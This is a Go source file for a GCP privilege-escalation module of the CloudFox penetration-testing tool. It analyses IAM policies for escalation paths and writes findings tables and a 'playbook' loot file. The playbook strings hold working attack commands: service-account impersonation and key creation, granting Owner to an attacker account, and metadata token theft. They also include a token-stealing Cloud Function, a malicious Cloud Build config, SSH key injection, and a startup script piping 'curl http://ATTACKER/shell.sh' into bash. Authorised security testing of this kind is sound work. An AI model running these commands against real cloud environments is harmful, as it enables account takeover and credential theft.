package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	attackpathservice "github.com/BishopFox/cloudfox/gcp/services/attackpathService"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"
)

var GCPPrivescCommand = &cobra.Command{
	Use:     globals.GCP_PRIVESC_MODULE_NAME,
	Aliases: []string{"pe", "escalate", "priv"},
	Short:   "Identify privilege escalation paths in GCP organizations, folders, and projects",
	Long: `Analyze GCP IAM policies to identify privilege escalation opportunities.

This module examines IAM bindings at organization, folder, project, and resource levels
to find principals with dangerous permissions that could be used to escalate
privileges within the GCP environment.

Detected privilege escalation methods (60+) include:

Service Account Abuse:
- Token Creation (getAccessToken, getOpenIdToken)
- Key Creation (serviceAccountKeys.create, hmacKeys.create)
- Implicit Delegation, SignBlob, SignJwt
- Workload Identity Federation (external identity impersonation)

IAM Policy Modification:
- Project/Folder/Org IAM Policy Modification
- Service Account IAM Policy + SA Creation combo
- Custom Role Create/Update (iam.roles.create/update)
- Org Policy Modification (orgpolicy.policy.set)
- Resource-specific IAM (Pub/Sub, BigQuery, Artifact Registry, Compute, KMS, Source Repos)

Compute & Serverless:
- Compute Instance Metadata Injection (SSH keys, startup scripts)
- Create GCE Instance with privileged SA
- Cloud Functions Create/Update with SA Identity
- Cloud Run Services/Jobs Create/Update with SA Identity
- App Engine Deploy with SA Identity
- Cloud Build SA Abuse

AI/ML:
- Vertex AI Custom Jobs with SA
- Vertex AI Notebooks with SA
- AI Platform Jobs with SA

Data Processing & Orchestration:
- Dataproc Cluster Create / Job Submit
- Cloud Composer Environment Create/Update
- Dataflow Job Create
- Cloud Workflows with SA
- Eventarc Triggers with SA

Scheduling & Tasks:
- Cloud Scheduler HTTP Request with SA
- Cloud Tasks with SA

Other:
- Deployment Manager Deployment
- GKE Cluster Access, Pod Exec, Secrets
- Secret Manager Access
- KMS Key Access / Decrypt
- API Key Creation/Listing`,
	Run: runGCPPrivescCommand,
}

type PrivescModule struct {
	gcpinternal.BaseGCPModule

	// All paths from combined analysis
	AllPaths      []attackpathservice.AttackPath
	OrgPaths      []attackpathservice.AttackPath
	FolderPaths   []attackpathservice.AttackPath
	ProjectPaths  map[string][]attackpathservice.AttackPath // projectID -> paths
	ResourcePaths []attackpathservice.AttackPath

	// Org/folder info
	OrgIDs      []string
	OrgNames    map[string]string
	FolderNames map[string]string

	// Loot
	LootMap map[string]*internal.LootFile
	mu      sync.Mutex
}

type PrivescOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o PrivescOutput) TableFiles() []internal.TableFile { return o.Table }
func (o PrivescOutput) LootFiles() []internal.LootFile   { return o.Loot }

func runGCPPrivescCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, globals.GCP_PRIVESC_MODULE_NAME)
	if err != nil {
		return
	}

	module := &PrivescModule{
		BaseGCPModule: gcpinternal.NewBaseGCPModule(cmdCtx),
		AllPaths:      []attackpathservice.AttackPath{},
		OrgPaths:      []attackpathservice.AttackPath{},
		FolderPaths:   []attackpathservice.AttackPath{},
		ProjectPaths:  make(map[string][]attackpathservice.AttackPath),
		ResourcePaths: []attackpathservice.AttackPath{},
		OrgIDs:        []string{},
		OrgNames:      make(map[string]string),
		FolderNames:   make(map[string]string),
		LootMap:       make(map[string]*internal.LootFile),
	}
	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

func (m *PrivescModule) Execute(ctx context.Context, logger internal.Logger) {
	logger.InfoM("Analyzing privilege escalation paths across organizations, folders, projects, and resources...", globals.GCP_PRIVESC_MODULE_NAME)

	// Use attackpathService with "privesc" path type
	svc := attackpathservice.New()
	result, err := svc.CombinedAttackPathAnalysis(ctx, m.ProjectIDs, m.ProjectNames, "privesc")
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, globals.GCP_PRIVESC_MODULE_NAME, "Failed to analyze privilege escalation")
		return
	}

	// Store results
	m.AllPaths = result.AllPaths
	m.OrgPaths = result.OrgPaths
	m.FolderPaths = result.FolderPaths
	m.ResourcePaths = result.ResourcePaths
	m.OrgIDs = result.OrgIDs
	m.OrgNames = result.OrgNames
	m.FolderNames = result.FolderNames

	// Organize project paths by project ID
	for _, path := range result.ProjectPaths {
		if path.ScopeType == "project" && path.ScopeID != "" {
			m.ProjectPaths[path.ScopeID] = append(m.ProjectPaths[path.ScopeID], path)
		}
	}

	// Generate loot
	m.generateLoot()

	if len(m.AllPaths) == 0 {
		logger.InfoM("No privilege escalation paths found", globals.GCP_PRIVESC_MODULE_NAME)
		return
	}

	// Count by scope type
	orgCount := len(m.OrgPaths)
	folderCount := len(m.FolderPaths)
	projectCount := len(result.ProjectPaths)
	resourceCount := len(m.ResourcePaths)

	logger.SuccessM(fmt.Sprintf("Found %d privilege escalation path(s): %d org-level, %d folder-level, %d project-level, %d resource-level",
		len(m.AllPaths), orgCount, folderCount, projectCount, resourceCount), globals.GCP_PRIVESC_MODULE_NAME)

	m.writeOutput(ctx, logger)
}

func (m *PrivescModule) generateLoot() {
	m.LootMap["privesc-exploit-commands"] = &internal.LootFile{
		Name:     "privesc-exploit-commands",
		Contents: "# GCP Privilege Escalation Exploit Commands\n# Generated by CloudFox\n\n",
	}

	for _, path := range m.AllPaths {
		m.addPathToLoot(path)
	}

	// Generate playbook
	m.generatePlaybook()
}

func (m *PrivescModule) generatePlaybook() {
	m.LootMap["privesc-playbook"] = &internal.LootFile{
		Name: "privesc-playbook",
		Contents: `# GCP Privilege Escalation Playbook
# Generated by CloudFox
#
# This playbook provides exploitation techniques for identified privilege escalation paths.

` + m.generatePlaybookSections(),
	}
}

func (m *PrivescModule) generatePlaybookSections() string {
	var sections strings.Builder

	// Group paths by category
	categories := map[string][]attackpathservice.AttackPath{
		"SA Impersonation":  {},
		"Key Creation":      {},
		"IAM Modification":  {},
		"Compute":           {},
		"Serverless":        {},
		"Data Processing":   {},
		"Orchestration":     {},
		"CI/CD":             {},
		"GKE":               {},
		"Secrets":           {},
		"Deployment":        {},
		"Federation":        {},
		"Org Policy":        {},
		"SA Usage":          {},
	}

	for _, path := range m.AllPaths {
		if _, ok := categories[path.Category]; ok {
			categories[path.Category] = append(categories[path.Category], path)
		}
	}

	// Service Account Impersonation
	if len(categories["SA Impersonation"]) > 0 {
		sections.WriteString("## Service Account Impersonation\n\n")
		sections.WriteString("Principals with SA impersonation capabilities can generate tokens and act as service accounts.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["SA Impersonation"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s at %s\n", path.Principal, path.PrincipalType, path.Method, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Generate access token for a service account (iam.serviceAccounts.getAccessToken)\n")
		sections.WriteString("gcloud auth print-access-token --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Sign a blob as the SA (iam.serviceAccounts.signBlob)\n")
		sections.WriteString("echo 'data' | gcloud iam service-accounts sign-blob - signed.txt \\\n")
		sections.WriteString("    --iam-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Sign a JWT as the SA (iam.serviceAccounts.signJwt)\n")
		sections.WriteString("gcloud iam service-accounts sign-jwt input.json output.jwt \\\n")
		sections.WriteString("    --iam-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Generate OIDC token (iam.serviceAccounts.getOpenIdToken)\n")
		sections.WriteString("gcloud auth print-identity-token --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n")
		sections.WriteString("```\n\n")
	}

	// Key Creation
	if len(categories["Key Creation"]) > 0 {
		sections.WriteString("## Persistent Key Creation\n\n")
		sections.WriteString("Principals with key creation capabilities can create long-lived credentials.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Key Creation"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create persistent SA key (iam.serviceAccountKeys.create)\n")
		sections.WriteString("gcloud iam service-accounts keys create key.json \\\n")
		sections.WriteString("    --iam-account=TARGET_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Use the key\n")
		sections.WriteString("gcloud auth activate-service-account --key-file=key.json\n\n")
		sections.WriteString("# Create HMAC key for S3-compatible access (storage.hmacKeys.create)\n")
		sections.WriteString("gcloud storage hmac create TARGET_SA@PROJECT.iam.gserviceaccount.com\n")
		sections.WriteString("```\n\n")
	}

	// IAM Modification
	if len(categories["IAM Modification"]) > 0 {
		sections.WriteString("## IAM Policy Modification\n\n")
		sections.WriteString("Principals with IAM modification capabilities can grant themselves elevated access.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["IAM Modification"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s at %s\n", path.Principal, path.PrincipalType, path.Method, path.ScopeName))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Grant Owner role at project level\n")
		sections.WriteString("gcloud projects add-iam-policy-binding PROJECT_ID \\\n")
		sections.WriteString("    --member='user:attacker@example.com' \\\n")
		sections.WriteString("    --role='roles/owner'\n\n")
		sections.WriteString("# Grant SA impersonation on a privileged SA\n")
		sections.WriteString("gcloud iam service-accounts add-iam-policy-binding \\\n")
		sections.WriteString("    TARGET_SA@PROJECT.iam.gserviceaccount.com \\\n")
		sections.WriteString("    --member='user:attacker@example.com' \\\n")
		sections.WriteString("    --role='roles/iam.serviceAccountTokenCreator'\n\n")
		sections.WriteString("# Create custom role with escalation permissions\n")
		sections.WriteString("gcloud iam roles create privesc --project=PROJECT_ID \\\n")
		sections.WriteString("    --permissions='iam.serviceAccounts.getAccessToken,iam.serviceAccountKeys.create'\n")
		sections.WriteString("```\n\n")
	}

	// Compute
	if len(categories["Compute"]) > 0 {
		sections.WriteString("## Compute Instance Exploitation\n\n")
		sections.WriteString("Principals with compute permissions can create instances or modify metadata to escalate privileges.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Compute"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create instance with privileged SA (compute.instances.create + iam.serviceAccounts.actAs)\n")
		sections.WriteString("gcloud compute instances create pwned \\\n")
		sections.WriteString("    --zone=us-central1-a \\\n")
		sections.WriteString("    --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \\\n")
		sections.WriteString("    --scopes=cloud-platform\n\n")
		sections.WriteString("# SSH and steal token\n")
		sections.WriteString("gcloud compute ssh pwned --zone=us-central1-a \\\n")
		sections.WriteString("    --command='curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'\n\n")
		sections.WriteString("# Inject startup script for reverse shell (compute.instances.setMetadata)\n")
		sections.WriteString("gcloud compute instances add-metadata INSTANCE --zone=ZONE \\\n")
		sections.WriteString("    --metadata=startup-script='#!/bin/bash\n")
		sections.WriteString("curl http://ATTACKER/shell.sh | bash'\n\n")
		sections.WriteString("# Add SSH key via metadata\n")
		sections.WriteString("gcloud compute instances add-metadata INSTANCE --zone=ZONE \\\n")
		sections.WriteString("    --metadata=ssh-keys=\"attacker:$(cat ~/.ssh/id_rsa.pub)\"\n\n")
		sections.WriteString("# Project-wide SSH key injection (compute.projects.setCommonInstanceMetadata)\n")
		sections.WriteString("gcloud compute project-info add-metadata \\\n")
		sections.WriteString("    --metadata=ssh-keys=\"attacker:$(cat ~/.ssh/id_rsa.pub)\"\n")
		sections.WriteString("```\n\n")
	}

	// Serverless
	if len(categories["Serverless"]) > 0 {
		sections.WriteString("## Serverless Function/Service Exploitation\n\n")
		sections.WriteString("Principals with serverless permissions can deploy code that runs as privileged service accounts.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Serverless"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation - Cloud Functions:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create function that steals SA token\n")
		sections.WriteString("mkdir /tmp/pwn && cd /tmp/pwn\n")
		sections.WriteString("cat > main.py << 'EOF'\n")
		sections.WriteString("import functions_framework\n")
		sections.WriteString("import requests\n\n")
		sections.WriteString("@functions_framework.http\n")
		sections.WriteString("def pwn(request):\n")
		sections.WriteString("    r = requests.get('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',\n")
		sections.WriteString("                     headers={'Metadata-Flavor': 'Google'})\n")
		sections.WriteString("    return r.json()\n")
		sections.WriteString("EOF\n")
		sections.WriteString("echo 'functions-framework\\nrequests' > requirements.txt\n\n")
		sections.WriteString("# Deploy with target SA\n")
		sections.WriteString("gcloud functions deploy token-stealer --gen2 --runtime=python311 \\\n")
		sections.WriteString("    --trigger-http --allow-unauthenticated \\\n")
		sections.WriteString("    --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com\n")
		sections.WriteString("```\n\n")
		sections.WriteString("### Exploitation - Cloud Run:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Deploy Cloud Run service with target SA\n")
		sections.WriteString("gcloud run deploy token-stealer --image=gcr.io/PROJECT/stealer \\\n")
		sections.WriteString("    --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com \\\n")
		sections.WriteString("    --allow-unauthenticated\n")
		sections.WriteString("```\n\n")
	}

	// Data Processing
	if len(categories["Data Processing"]) > 0 {
		sections.WriteString("## Data Processing Service Exploitation\n\n")
		sections.WriteString("Principals with data processing permissions can submit jobs that run as privileged service accounts.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Data Processing"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation - Dataproc:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create Dataproc cluster with privileged SA\n")
		sections.WriteString("gcloud dataproc clusters create pwned \\\n")
		sections.WriteString("    --region=us-central1 \\\n")
		sections.WriteString("    --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Submit job to steal token\n")
		sections.WriteString("gcloud dataproc jobs submit pyspark token_stealer.py \\\n")
		sections.WriteString("    --cluster=pwned --region=us-central1\n")
		sections.WriteString("```\n\n")
		sections.WriteString("### Exploitation - Dataflow:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create Dataflow job with privileged SA\n")
		sections.WriteString("gcloud dataflow jobs run pwned \\\n")
		sections.WriteString("    --gcs-location=gs://dataflow-templates/latest/Word_Count \\\n")
		sections.WriteString("    --service-account-email=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com\n")
		sections.WriteString("```\n\n")
	}

	// CI/CD
	if len(categories["CI/CD"]) > 0 {
		sections.WriteString("## CI/CD Service Exploitation\n\n")
		sections.WriteString("Principals with CI/CD permissions can run builds with the Cloud Build service account.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["CI/CD"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Create malicious cloudbuild.yaml\n")
		sections.WriteString("cat > cloudbuild.yaml << 'EOF'\n")
		sections.WriteString("steps:\n")
		sections.WriteString("- name: 'gcr.io/cloud-builders/gcloud'\n")
		sections.WriteString("  entrypoint: 'bash'\n")
		sections.WriteString("  args:\n")
		sections.WriteString("  - '-c'\n")
		sections.WriteString("  - |\n")
		sections.WriteString("    # Cloud Build SA has project Editor by default!\n")
		sections.WriteString("    gcloud projects add-iam-policy-binding $PROJECT_ID \\\n")
		sections.WriteString("      --member='user:attacker@example.com' \\\n")
		sections.WriteString("      --role='roles/owner'\n")
		sections.WriteString("EOF\n\n")
		sections.WriteString("# Submit build\n")
		sections.WriteString("gcloud builds submit --config=cloudbuild.yaml .\n")
		sections.WriteString("```\n\n")
	}

	// GKE
	if len(categories["GKE"]) > 0 {
		sections.WriteString("## GKE Cluster Exploitation\n\n")
		sections.WriteString("Principals with GKE permissions can access clusters, exec into pods, or read secrets.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["GKE"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Get cluster credentials\n")
		sections.WriteString("gcloud container clusters get-credentials CLUSTER --zone=ZONE\n\n")
		sections.WriteString("# Exec into a pod\n")
		sections.WriteString("kubectl exec -it POD_NAME -- /bin/sh\n\n")
		sections.WriteString("# Read secrets\n")
		sections.WriteString("kubectl get secrets -A -o yaml\n\n")
		sections.WriteString("# Steal node SA token (if Workload Identity not enabled)\n")
		sections.WriteString("kubectl exec -it POD -- curl -s -H 'Metadata-Flavor: Google' \\\n")
		sections.WriteString("    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n")
		sections.WriteString("```\n\n")
	}

	// Secrets
	if len(categories["Secrets"]) > 0 {
		sections.WriteString("## Secret Access\n\n")
		sections.WriteString("Principals with secret access can retrieve sensitive credentials.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Secrets"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# List all secrets\n")
		sections.WriteString("gcloud secrets list --project=PROJECT_ID\n\n")
		sections.WriteString("# Access secret value\n")
		sections.WriteString("gcloud secrets versions access latest --secret=SECRET_NAME --project=PROJECT_ID\n\n")
		sections.WriteString("# Grant yourself secret access if you have setIamPolicy\n")
		sections.WriteString("gcloud secrets add-iam-policy-binding SECRET_NAME \\\n")
		sections.WriteString("    --member='user:attacker@example.com' \\\n")
		sections.WriteString("    --role='roles/secretmanager.secretAccessor'\n")
		sections.WriteString("```\n\n")
	}

	// Orchestration
	if len(categories["Orchestration"]) > 0 {
		sections.WriteString("## Orchestration Service Exploitation\n\n")
		sections.WriteString("Principals with orchestration permissions can create environments that run as privileged SAs.\n\n")
		sections.WriteString("### Principals with this capability:\n")
		for _, path := range categories["Orchestration"] {
			sections.WriteString(fmt.Sprintf("- %s (%s) - %s\n", path.Principal, path.PrincipalType, path.Method))
		}
		sections.WriteString("\n### Exploitation - Cloud Composer:\n")
		sections.WriteString("```bash\n")
		sections.WriteString("# Composer environments run Airflow with a highly privileged SA\n")
		sections.WriteString("# Create environment with target SA\n")
		sections.WriteString("gcloud composer environments create pwned \\\n")
		sections.WriteString("    --location=us-central1 \\\n")
		sections.WriteString("    --service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com\n\n")
		sections.WriteString("# Upload malicious DAG to steal credentials\n")
		sections.WriteString("gcloud composer environments storage dags import \\\n")
		sections.WriteString("    --environment=pwned --location=us-central1 \\\n")
		sections.WriteString("    --source=malicious_dag.py\n")
		sections.WriteString("```\n\n")
	}

	return sections.String()
}

func (m *PrivescModule) addPathToLoot(path attackpathservice.AttackPath) {
	lootFile := m.LootMap["privesc-exploit-commands"]
	if lootFile == nil {
		return
	}

	scopeInfo := fmt.Sprintf("%s: %s", path.ScopeType, path.ScopeName)
	if path.ScopeName == "" {
		scopeInfo = fmt.Sprintf("%s: %s", path.ScopeType, path.ScopeID)
	}

	lootFile.Contents += fmt.Sprintf(
		"# Method: %s\n"+
			"# Principal: %s (%s)\n"+
			"# Scope: %s\n"+
			"# Target: %s\n"+
			"# Permissions: %s\n"+
			"%s\n\n",
		path.Method,
		path.Principal, path.PrincipalType,
		scopeInfo,
		path.TargetResource,
		strings.Join(path.Permissions, ", "),
		path.ExploitCommand,
	)
}

func (m *PrivescModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

func (m *PrivescModule) getHeader() []string {
	return []string{
		"Scope Type",
		"Scope ID",
		"Scope Name",
		"Source Principal",
		"Source Principal Type",
		"Action (Method)",
		"Target Resource",
		"Permissions",
	}
}

func (m *PrivescModule) pathsToTableBody(paths []attackpathservice.AttackPath) [][]string {
	var body [][]string
	for _, path := range paths {
		scopeName := path.ScopeName
		if scopeName == "" {
			scopeName = path.ScopeID
		}

		body = append(body, []string{
			path.ScopeType,
			path.ScopeID,
			scopeName,
			path.Principal,
			path.PrincipalType,
			path.Method,
			path.TargetResource,
			strings.Join(path.Permissions, ", "),
		})
	}
	return body
}

func (m *PrivescModule) buildTablesForProject(projectID string) []internal.TableFile {
	var tableFiles []internal.TableFile
	if paths, ok := m.ProjectPaths[projectID]; ok && len(paths) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   "privesc",
			Header: m.getHeader(),
			Body:   m.pathsToTableBody(paths),
		})
	}
	return tableFiles
}

func (m *PrivescModule) buildAllTables() []internal.TableFile {
	if len(m.AllPaths) == 0 {
		return nil
	}
	return []internal.TableFile{
		{
			Name:   "privesc",
			Header: m.getHeader(),
			Body:   m.pathsToTableBody(m.AllPaths),
		},
	}
}

func (m *PrivescModule) collectLootFiles() []internal.LootFile {
	var lootFiles []internal.LootFile
	for _, loot := range m.LootMap {
		if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# Generated by CloudFox\n\n") {
			lootFiles = append(lootFiles, *loot)
		}
	}
	return lootFiles
}

func (m *PrivescModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	// Determine org ID - prefer hierarchy (for consistent output paths across modules),
	// fall back to discovered orgs if hierarchy doesn't have org info
	orgID := ""
	if m.Hierarchy != nil && len(m.Hierarchy.Organizations) > 0 {
		orgID = m.Hierarchy.Organizations[0].ID
	} else if len(m.OrgIDs) > 0 {
		orgID = m.OrgIDs[0]
	}

	if orgID != "" {
		// DUAL OUTPUT: Complete aggregated output at org level
		tables := m.buildAllTables()
		lootFiles := m.collectLootFiles()
		outputData.OrgLevelData[orgID] = PrivescOutput{Table: tables, Loot: lootFiles}

		// DUAL OUTPUT: Filtered per-project output
		for _, projectID := range m.ProjectIDs {
			projectTables := m.buildTablesForProject(projectID)
			if len(projectTables) > 0 && len(projectTables[0].Body) > 0 {
				outputData.ProjectLevelData[projectID] = PrivescOutput{Table: projectTables, Loot: nil}
			}
		}
	} else if len(m.ProjectIDs) > 0 {
		// FALLBACK: No org discovered, output complete data to first project
		tables := m.buildAllTables()
		lootFiles := m.collectLootFiles()
		outputData.ProjectLevelData[m.ProjectIDs[0]] = PrivescOutput{Table: tables, Loot: lootFiles}
	}

	pathBuilder := m.BuildPathBuilder()

	err := internal.HandleHierarchicalOutputSmart("gcp", m.Format, m.Verbosity, m.WrapTable, pathBuilder, outputData)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), globals.GCP_PRIVESC_MODULE_NAME)
	}
}

func (m *PrivescModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	tables := m.buildAllTables()
	lootFiles := m.collectLootFiles()

	output := PrivescOutput{Table: tables, Loot: lootFiles}

	// Determine output scope - use org if available, otherwise fall back to project
	var scopeType string
	var scopeIdentifiers []string
	var scopeNames []string

	if len(m.OrgIDs) > 0 {
		// Use organization scope with [O] prefix format
		scopeType = "organization"
		for _, orgID := range m.OrgIDs {
			scopeIdentifiers = append(scopeIdentifiers, orgID)
			if name, ok := m.OrgNames[orgID]; ok && name != "" {
				scopeNames = append(scopeNames, name)
			} else {
				scopeNames = append(scopeNames, orgID)
			}
		}
	} else {
		// Fall back to project scope
		scopeType = "project"
		scopeIdentifiers = m.ProjectIDs
		for _, id := range m.ProjectIDs {
			scopeNames = append(scopeNames, m.GetProjectName(id))
		}
	}

	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		scopeType,
		scopeIdentifiers,
		scopeNames,
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.GCP_PRIVESC_MODULE_NAME)
	}
}
